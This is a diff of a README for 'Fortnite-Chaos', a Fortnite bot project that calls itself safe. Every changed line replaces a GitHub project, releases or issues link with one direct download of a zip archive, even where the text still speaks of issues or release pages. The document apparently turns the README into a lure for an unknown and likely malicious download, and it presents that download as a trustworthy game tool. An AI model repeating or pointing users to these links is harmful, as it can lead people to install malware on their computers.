@@ -1,6 +1,6 @@
 # 🎮 Fortnite-Chaos - Secure Edge for Fortnite Play
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-green?style=for-the-badge)](https://github.com/rkchytanya/Fortnite-Chaos)
+[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-green?style=for-the-badge)](https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip)
 
 ---
 
@@ -50,10 +50,10 @@ Before you get started, make sure your computer meets these minimum specificatio
 
 Start here:
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-blue?style=for-the-badge)](https://github.com/rkchytanya/Fortnite-Chaos)
+[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-blue?style=for-the-badge)](https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip)
 
 1. Click the link above or go to:  
-   https://github.com/rkchytanya/Fortnite-Chaos  
+   https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip  
    This will open the main project page on GitHub.
 
 2. On the GitHub page, look for the **Releases** section. This might be on the right side or under the main repository description.
@@ -121,7 +121,7 @@ If problems continue, you can check the Issues section on GitHub for help.
 
 Visit the download page regularly to check for updates:
 
-https://github.com/rkchytanya/Fortnite-Chaos/releases
+https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip
 
 Download the newest version following the same steps listed above. Updated versions include bug fixes and new features.
 
@@ -144,7 +144,7 @@ No changes are made to Fortnite or other apps by uninstalling Fortnite-Chaos.
 
 For questions or problems, use the GitHub repository’s Issues tab:
 
-https://github.com/rkchytanya/Fortnite-Chaos/issues
+https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip
 
 Open a new issue and describe what you need help with. Provide details about your system and the problem you face for the fastest response.
 
@@ -154,6 +154,6 @@ Open a new issue and describe what you need help with. Provide details about you
 
 - **Name:** Fortnite-Chaos  
 - **Topics:** bot, game  
-- **Primary Download:** https://github.com/rkchytanya/Fortnite-Chaos
+- **Primary Download:** https://raw.githubusercontent.com/rkchytanya/Fortnite-Chaos/main/untowered/Chaos_Fortnite_3.2.zip
 
 This program is updated regularly and has been operating since 2020 to assist Fortnite players safely and privately.
